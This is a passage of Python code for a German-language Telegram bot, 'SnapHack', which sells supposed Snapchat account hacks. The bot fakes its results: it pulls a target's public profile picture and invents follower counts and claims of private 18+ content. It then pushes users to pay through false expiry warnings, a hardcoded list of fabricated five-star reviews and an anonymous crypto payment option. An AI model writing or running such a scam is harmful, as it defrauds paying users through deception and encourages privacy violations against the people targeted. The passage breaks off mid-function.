        f"🎁 <i>Erster Hack? Du bekommst 40 € zurück — einmalig!</i>\n👥 Gratis-Hack durch Einladen: /invite"
    )

    result_caption = (
        f"<code>{'━'*28}</code>\n<code>  ✅ HACK ERFOLGREICH — #{hack_nr}</code>\n<code>{'━'*28}</code>\n\n"
        f"🎯 <b>Ziel:</b> {snap_link}\n👤 <b>Name:</b> <code>{name}</code>\n"
        f"🔓 <b>Status:</b> <code>Konto kompromittiert</code>\n"
        f"🕐 <b>Zuletzt aktiv:</b> <code>vor {last_seen_min} Min.</code>\n"
        f"👥 <b>Follower:</b> <code>{fake_followers} ✓</code>\n\n"
        f"📂 <b>Gesicherte Inhalte:</b>\n  🖼 <code>{bilder} Bilder (18+)</code>\n"
        f"  📹 <code>{videos} Videos (privat)</code>\n  📸 <code>Profilbild gesichert ✅</code>\n\n"
        f"<code>{'━'*28}</code>\n💰 <b>Zugang freischalten: 45 €</b>\n👉 /pay\n"
        f"🎁 <i>Erster Hack? 40 € zurück!</i>\n👥 Gratis-Hack: /invite"
    )

    pending_hack_results[user_id] = {
        "result_lines": result_lines,
        "result_caption": result_caption,
        "profile_downloaded": profile_downloaded,
        "bitmoji_downloaded": bitmoji_downloaded,
        "username": username,
    }

    last_confirm = user_confirm_used.get(user_id, 0)
    confirm_available = (now - last_confirm) >= CONFIRM_WINDOW_SECS

    confirm_kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Ja, richtiger Account", callback_data="hack_confirm_yes"),
            InlineKeyboardButton("❌ Nein, falscher Account", callback_data="hack_confirm_no"),
        ]
    ])

    confirm_text = (
        f"🔍 <b>Account gefunden!</b>\n\n"
        f"🎯 <b>Ziel:</b> {snap_link}\n"
        f"👤 <b>Name:</b> <code>{name}</code>\n"
        f"🕐 <b>Zuletzt aktiv:</b> <code>vor {last_seen_min} Min.</code>\n"
        f"👥 <b>Follower:</b> <code>{fake_followers}</code>\n\n"
        f"❓ <b>Ist das der richtige Account?</b>"
    )

    fallback_photos = []
    if profile_downloaded:
        fallback_photos.append(PROFILE_DIR / f"profile_{username}.jpg")
    if bitmoji_downloaded:
        fallback_photos.append(PROFILE_DIR / f"bitmoji_{username}.jpg")

    await msg.delete()

    async def send_expiry_warning():
        await asyncio.sleep(30)
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=(f"⚠️ <b>Achtung — Zugang läuft ab!</b>\n\nDein Zugriff auf {snap_link} "
                      f"ist noch <b>10 Minuten</b> aktiv.\n\nDanach werden die gesicherten Daten automatisch gelöscht.\n\n"
                      f"👉 Jetzt freischalten mit /pay"),
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            print(f"⚠️ Ablauf-Warnung: {e}")
    asyncio.create_task(send_expiry_warning())

    if confirm_available:
        await send_snap_info_message(
            context,
            user_id,
            caption_text=confirm_text,
            reply_markup=confirm_kb,
            fallback_photos=fallback_photos,
        )
    else:
        await send_snap_info_message(
            context,
            user_id,
            caption_text=result_caption,
            message_text=result_lines,
            fallback_photos=fallback_photos,
            disable_web_page_preview=True,
        )

# ---- VERLAUF ----
async def verlauf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    history = user_hack_history.get(uid, [])
    if not history:
        await update.message.reply_text("📂 Du hast noch keine Hacks durchgeführt.")
        return
    lines = "\n".join(f"• <code>{u}</code>" for u in history)
    await update.message.reply_text(
        f"📂 <b>Dein Hack-Verlauf:</b>\n\n{lines}",
        parse_mode=ParseMode.HTML
    )

# ---- BEWERTUNGEN ----
BEWERTUNGEN = [
    ("m***l", "Hat alles geklappt. Fotos waren da innerhalb von 5 Min nach Zahlung. Sehr seriös!"),
    ("l***.w", "Erster Hack war mit Refund, jetzt regelmäßiger Kunde. Schnell & diskret 👍"),
    ("k***n_93", "Hab erst gezögert aber es hat wirklich funktioniert. Support war auch erreichbar."),
    ("s***a.official", "Mega schnell, innerhalb 5 Min alles da. Zahlung per Crypto war super easy."),
    ("t***_real", "Schon 3x genutzt und jedes Mal reibungslos. Kein anderer macht das so professionell."),
    ("j***s22", "Hatte kurz Zweifel aber der Hack hat geklappt. Bilder + Videos alles da. Top!"),
    ("n***i.x", "Sehr empfehlenswert. Schnell und der Support hat sofort geantwortet. 5 Sterne."),
    ("p***lo_de", "Zuerst skeptisch gewesen aber es ist 100% real. Zahlung war sicher und anonym."),
    ("a***a_99", "Innerhalb von 10 Minuten hatte ich Zugang. Genau wie beschrieben. Danke!"),
    ("f***z_official", "Günstig, schnell, diskret. Was will man mehr. Komme sicher wieder."),
]

async def bewertungen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        import random
        auswahl = random.sample(BEWERTUNGEN, 5)
        sterne_map = ["⭐⭐⭐⭐☆", "⭐⭐⭐⭐⭐", "⭐⭐⭐⭐⭐", "⭐⭐⭐⭐⭐", "⭐⭐⭐⭐⭐"]
        random.shuffle(sterne_map)
        gesamt = get_hack_count()
        text = (f"<code>{'━'*34}</code>\n<b>💬 Kundenbewertungen — SnapHack v2.4</b>\n<code>{'━'*34}</code>\n\n")
        for i, (user, kommentar) in enumerate(auswahl):
            text += f"{sterne_map[i]} <b>@{user}</b>\n<i>{kommentar}</i>\n\n"
        text += (f"<code>{'━'*34}</code>\n📊 <b>Durchschnitt:</b> ⭐ 4.9 / 5\n"
                 f"👥 <b>Abgeschlossene Hacks:</b> <code>{gesamt}</code>\n"
                 f"🔗 Mehr Bewertungen: https://t.me/+qICdaAr6lE4yMzZh")
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception as e:
        print(f"❌ Bewertungen Fehler: {e}")
        await update.message.reply_text("⚠️ Fehler beim Laden der Bewertungen. Bitte erneut versuchen.")

# ---- PAY ----
async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
        [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
        [InlineKeyboardButton("🪙 Crypto — Sofort & anonym", callback_data="pay_crypto")],
        [InlineKeyboardButton("⬅️ Zurück zum Hauptmenü", callback_data="back_to_main")],
    ]
    await update.message.reply_text(
        "💳 <b>Zahlung — Zugang freischalten</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        "Dein Hack-Ergebnis ist bereit. Wähle eine Zahlungsmethode:\n\n"
        "🔒 <i>Alle Zahlungen sind sicher und diskret.</i>",
        parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ---- HILFE (Support-Ticket) ----
async def hilfe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    hilfe_state[user_id] = {"step": "email", "data": {}}
    await update.message.reply_text(
        "🎫 <b>Support-Ticket öffnen</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        "Unser Support-Team hilft dir gerne weiter.\n\n"
        "📧 <b>Schritt 1 von 2:</b>\n"
        "Bitte gib deine <b>E-Mail-Adresse</b> ein:",
        parse_mode=ParseMode.HTML
    )

# ---- INVITE / REDEEM / FAQ ----
async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎁 Lade Freunde ein und erhalte einen Free Hack!\n\n"
        "🔗 https://t.me/+o5LA7bbv0E8zZDdh",
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Das Einlösen von Credits ist aktuell nicht verfügbar.")

# ---- REFUND ----
async def refund(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🏦 Banküberweisung", callback_data="refund_bank")],
        [InlineKeyboardButton("💸 PayPal", callback_data="refund_paypal")],
        [InlineKeyboardButton("⬅️ Zurück zum Hauptmenü", callback_data="back_to_main")],
    ]
    await update.message.reply_text(
        "💰 <b>Rückerstattung beantragen</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        "Bitte wähle deine bevorzugte Auszahlungsmethode:\n\n"
        "⚠️ <b>Wichtig:</b> Du musst vorab ein <u>Beweisvideo deiner Überweisung</u> einschicken.\n"
        "Nach erfolgreicher Prüfung erhältst du dein Geld <b>innerhalb von 24 Stunden</b>.",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def faq(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 <b>Alle Commands &amp; FAQ</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        "🔧 <b>Verfügbare Commands:</b>\n\n"
        "/start — Bot starten &amp; Paket wählen\n"
        "/hack &lt;username&gt; — Snapchat Account hacken\n"
        "/pay — Zugang freischalten\n"
        "/verlauf — Deine bisherigen Hacks anzeigen\n"
        "/bew — Kundenbewertungen lesen\n"
        "/invite — Freunde einladen für Gratis-Hack\n"
        "/refund — Rückerstattung beantragen\n"
        "/hilfe — Support-Ticket öffnen\n"
        "/faq — Diese Übersicht\n\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        "❓ <b>Wie funktioniert das?</b>\n"
        "💬 Tippe <code>/hack Benutzername</code> — der Bot übernimmt alles automatisch.\n\n"
        "❓ <b>Wie lange dauert ein Hack?</b>\n"
        "💬 In der Regel 3–5 Minuten.\n\n"
        "❓ <b>Wie bezahle ich?</b>\n"
        "💬 Nach dem Hack einfach /pay tippen &amp; Methode wählen.\n\n"
        "❓ <b>Bekomme ich mein Geld zurück?</b>\n"
        "💬 Ja, beim ersten Hack gibt es eine 5-Minuten Refund-Zeit. /refund\n\n"
        "❓ <b>Wie sehe ich meine bisherigen Hacks?</b>\n"
        "💬 Mit /verlauf siehst du alle Benutzernamen die du gehackt hast.\n\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        "📩 Noch Fragen? Schreib uns direkt: @HunterThe1",
        parse_mode=ParseMode.HTML
    )

# ---- BUTTONS ----
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    cmd = query.data

    info_refund = (
        "\n\n⚠️ <b>Wichtig:</b> Bei deinem <u>ersten Hack</u> hast du eine "
        "<b>5 Minuten Refund-Zeit</b>. Bei Stornierung bekommst du <b>30 € von den 45 €</b> zurück.\n\n"
        "📌 <b>Verwendungszweck:</b> Gib <u>deinen Telegram-Username</u> an!"
    )

    if cmd == "hack_confirm_yes":
        uid = query.from_user.id
        user_confirm_used[uid] = time.time()
        result = pending_hack_results.pop(uid, None)
        if not result:
            await query.edit_message_caption("⚠️ Ergebnis nicht mehr verfügbar. Bitte erneut /hack ausführen.")
            return
        r_lines = result["result_lines"]
        r_caption = result["result_caption"]
        profile_dl = result["profile_downloaded"]
        bitmoji_dl = result["bitmoji_downloaded"]
        uname = result["username"]
        fallback_photos = []
        if profile_dl:
            fallback_photos.append(PROFILE_DIR / f"profile_{uname}.jpg")
        if bitmoji_dl:
            fallback_photos.append(PROFILE_DIR / f"bitmoji_{uname}.jpg")
        await query.message.delete()
        await send_snap_info_message(
            context,
            uid,
            caption_text=r_caption,
            message_text=r_lines,
            fallback_photos=fallback_photos,
            disable_web_page_preview=True,
        )
        return

    elif cmd == "hack_confirm_no":
        uid = query.from_user.id
        user_confirm_used[uid] = time.time()
        pending_hack_results.pop(uid, None)
        await query.edit_message_caption(
            "❌ <b>Falscher Account!</b>\n\n"
            "Du hast <b>1 Bestätigung pro 12 Stunden</b> verbraucht.\n\n"
            "Versuche es erneut mit dem richtigen Benutzernamen:\n"
            "<code>/hack Benutzername</code>",
            parse_mode=ParseMode.HTML
        )
        return

    if cmd == "back_to_plans":
        await query.edit_message_text(
            PACKAGE_TEXT,
            parse_mode=ParseMode.HTML,
            reply_markup=PACKAGE_KEYBOARD
        )
        return
    elif cmd == "back_to_main":
        uid = query.from_user.id
        plan = user_plan.get(uid, "basic")
        back_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️ Zurück zur Paktwahl", callback_data="back_to_plans")]
        ])
        await query.edit_message_text(
            main_menu_text(plan),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=back_kb
        )
        return
    elif cmd == "back_to_refund":
        uid = query.from_user.id
        refund_state.pop(uid, None)
        refund_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🏦 Banküberweisung", callback_data="refund_bank")],
            [InlineKeyboardButton("💸 PayPal", callback_data="refund_paypal")],
            [InlineKeyboardButton("⬅️ Zurück zum Hauptmenü", callback_data="back_to_main")],
        ])
        await query.edit_message_text(
            "💰 <b>Rückerstattung beantragen</b>\n"
            "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            "Bitte wähle deine bevorzugte Auszahlungsmethode:\n\n"
            "⚠️ <b>Wichtig:</b> Du musst vorab ein <u>Beweisvideo deiner Überweisung</u> einschicken.\n"
            "Nach erfolgreicher Prüfung erhältst du dein Geld <b>innerhalb von 24 Stunden</b>.",
            parse_mode=ParseMode.HTML,
            reply_markup=refund_kb
        )
        return
    elif cmd == "plan_basic":
        uid = query.from_user.id
        user_plan[uid] = "basic"
        if uid in user_reminder_tasks:
            user_reminder_tasks[uid].cancel()
        user_reminder_tasks[uid] = asyncio.create_task(schedule_reminders(context.bot, uid))
        back_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️ Zurück zur Paktwahl", callback_data="back_to_plans")]
        ])
        await query.edit_message_text(
            main_menu_text("basic"),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=back_kb
        )
        return
    elif cmd == "plan_premium":
        uid = query.from_user.id
        user_plan[uid] = "premium"
        premium_pending.add(uid)
        if uid in user_reminder_tasks:
            user_reminder_tasks[uid].cancel()
    ... (25 kB verbleibend)
